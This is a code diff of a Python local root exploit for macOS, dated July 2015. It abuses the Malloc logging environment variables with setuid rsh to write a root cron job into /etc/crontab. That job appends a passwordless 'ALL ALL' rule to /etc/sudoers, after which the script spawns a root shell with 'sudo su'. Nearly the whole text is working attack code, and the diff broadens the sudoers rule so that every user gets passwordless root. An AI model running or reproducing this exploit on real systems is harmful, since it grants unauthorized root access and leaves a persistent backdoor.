@@ -4,44 +4,36 @@
 # jul/2015
 import os,time,sys,subprocess
 whoami = subprocess.check_output(['whoami'])
+import os,time,sys
+
 env = {}
 
-def rsh():
-	s = os.stat("/etc/sudoers").st_size
+s = os.stat("/etc/sudoers").st_size
 
-	env['MallocLogFile'] = '/etc/crontab'
-	env['MallocStackLogging'] = 'yes'
-	env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo " %s ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\n\n\n\n\n' % whoami
+env['MallocLogFile'] = '/etc/crontab'
+env['MallocStackLogging'] = 'yes'
+env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers\n\n\n\n\n'
 
-	sys.stderr.write("creating /etc/crontab..")
+sys.stderr.write("creating /etc/crontab..")
 
-	proc = subprocess.Popen('whoami', stdout=subprocess.PIPE)
-	name = proc.stdout.read()
-	s = os.stat("/etc/sudoers").st_size
+p = os.fork()
+if p == 0:
+	os.close(1)
+	os.close(2)
+	os.execve("/usr/bin/rsh",["rsh","localhost"],env)
 
-	env['MallocLogFile'] = '/etc/crontab'
-	env['MallocStackLogging'] = 'yes'
-	env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo " $name ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\n\n\n\n\n'
-	env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo " %s ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\n\n\n\n\n' % whoami
+time.sleep(1)
 
+if "NOPASSWD" not in open("/etc/crontab").read():
+	sys.stderr.write("failed\n")
+	sys.exit(-1)
 
-	p = os.fork()
-	if p == 0:
-		os.close(1)
-		os.close(2)
-		os.execve("/usr/bin/rsh",["rsh","localhost"],env)
+sys.stderr.write("done\nwaiting for /etc/sudoers to change (<60 seconds)..")
 
+while os.stat("/etc/sudoers").st_size == s:
+	sys.stderr.write(".")
 	time.sleep(1)
 
-	if "NOPASSWD" not in open("/etc/crontab").read():
-		sys.stderr.write("failed\n")
-		sys.exit(-1)
+sys.stderr.write("\ndone\n")
 
-	sys.stderr.write("done\nwaiting for /etc/sudoers to change (<60 seconds)..")
-
-	while os.stat("/etc/sudoers").st_size == s:
-		sys.stderr.write(".")
-		time.sleep(1)
-
-	sys.stderr.write("\ndone\n")
-rsh()
+os.system("sudo su")
